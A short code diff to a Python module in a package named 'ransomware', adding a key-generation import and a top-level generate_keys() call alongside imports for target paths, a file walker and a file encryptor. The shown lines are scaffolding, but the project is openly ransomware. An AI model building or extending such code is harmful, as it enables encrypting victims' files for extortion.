@@ -6,10 +6,13 @@ from Crypto.Random import get_random_bytes
 from ransomware.config import TARGET_EXTENSION, TARGET_PATHS, PUBLIC_KEY_FILE
 from ransomware.file_walker import find_files
 from ransomware.encryptor import encrypt_file
-from ransomware.rsa_keys import encrypt_key
+from ransomware.rsa_keys import encrypt_key, generate_keys
 from ransomware.logger import log_encrypted
 
+generate_keys()
+
 def load_public_key():
+
     with open(PUBLIC_KEY_FILE, 'rb') as f:
         return f.read()
 
